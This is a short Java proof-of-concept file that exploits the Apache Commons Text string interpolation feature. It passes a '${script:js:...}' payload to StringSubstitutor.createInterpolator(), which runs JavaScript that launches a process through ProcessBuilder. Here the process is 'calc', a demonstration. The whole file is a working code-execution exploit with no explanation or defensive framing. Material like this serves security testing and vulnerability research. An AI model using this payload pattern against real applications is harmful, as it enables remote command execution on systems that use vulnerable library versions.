import org.apache.commons.text.StringSubstitutor;

class Demo{
    public static void main(String[] args){
        StringSubstitutor stringSubstitutorInterpolator = StringSubstitutor.createInterpolator();
        String payload = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";
        stringSubstitutorInterpolator.replace(payload);
    }
}